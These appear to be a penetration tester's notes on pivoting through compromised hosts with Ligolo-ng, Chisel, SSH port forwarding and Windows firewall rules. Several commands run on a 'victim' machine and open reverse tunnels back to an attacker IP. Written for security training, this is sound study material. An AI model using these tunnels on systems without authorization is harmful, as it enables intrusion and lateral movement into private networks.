> [!info] Always try to use **[Ligolo-ng](https://github.com/nicocha30/ligolo-ng)**

**[Hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding)**
**[HackTheBoxAcademy](https://academy.hackthebox.com/module/158/section/1425)**
#### Ligolo-ng

```text
Lets define some variables for the example:
	Our attack machine would be 192.168.45.211
	Our victim machine would be 192.168.222.63
	The unreachable network would be 10.4.222.0/24
	The unreachable machine we want to attack 10.4.222.215


- Setup in attack machine:
	# sudo ip tuntap add user $USER mode tun ligolo
	# sudo ip link set ligolo up
	# sudo ip route add 10.4.222.0/24 dev ligolo (Here we specify that the network route should go through our ligolo device)
	# ./proxy -selfcert (Note the port from the output: Listening on 0.0.0.0:11601)

- Launch agent in victim machine:
	# .\agent.exe -connect 192.168.45.211:11601 -ignore-cert

- In ligolo console:
	# session
	# start
	# listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 
		Here we specify a port forwarding where all connections recieved in the victim machine at port 8080 would be redirected to our attack achine at port 80. We can change this ports
		If error "bind: permission denied" appear we need to specify another unused port greather than 1000

- To clear everything once we have finished
	# sudo ip route del 10.4.222.0/24 dev ligolo
	# sudo ip link del ligolo
```


#### Chisel

If we have a SSH connection, use SSH Port forwarding instead of Chisel (ssh -D 8081 [root@10.129.160.194](mailto:root@10.129.160.194))

**[Reverse Dynamic SOCKS Proxy](https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/#reverse-dynamic-socks-proxy)

It is useful when we want to access to the host & multiple ports that cannot be directly accessible from local machine.

```bash
# In local machine (attack)
chisel server -p 9999 --reverse

# In remote machine (victim)
chisel client 192.168.49.124:9999 R:9000:socks

```

Then modify **`/etc/proxychains.conf`** in local machine.

Comment out the line of **"socks4"**.

```bash
# /etc/proxychains.conf
...
socks5 127.0.0.1 9000

```

To confirm if we can reach the desired host and port, run **nmap** with **proxychains**.

```bash
proxychains nmap localhost
```

#### SSH

##### Reverse proxy (From victim server to attack)

If we have a service which we cannot access from the outside, we can establish a port forwarding enabling SSH in our kali machine and establishing a connection from the victim machine. First, we need to enable SSH

```bash
kali $ sudo systemctl start ssh
```

And now we can set up a reverse port forward from the attack machine. Eg: exposing port 60002

```bash
www-data@milan:/home$ ssh -R *:40000:localhost:40000 kali@192.168.45.165
```

Now we have access from our kali machine

```bash
kali $ curl localhost:60002

<!DOCTYPE html>
<html lang="en">
<head>
        <meta charset="utf-8" />
[...SNIP...]
```

##### Dynamic port forwarding

From our attack machine to the victim machine:

```bash
ssh -D 8081 root@10.129.160.194
```

#### Windows - Firewall problems

If we are facing firewall in Windows we can open the port to establish the port forwarding

```shell
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
```

Now, to delete the rule and port forward

```shell
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```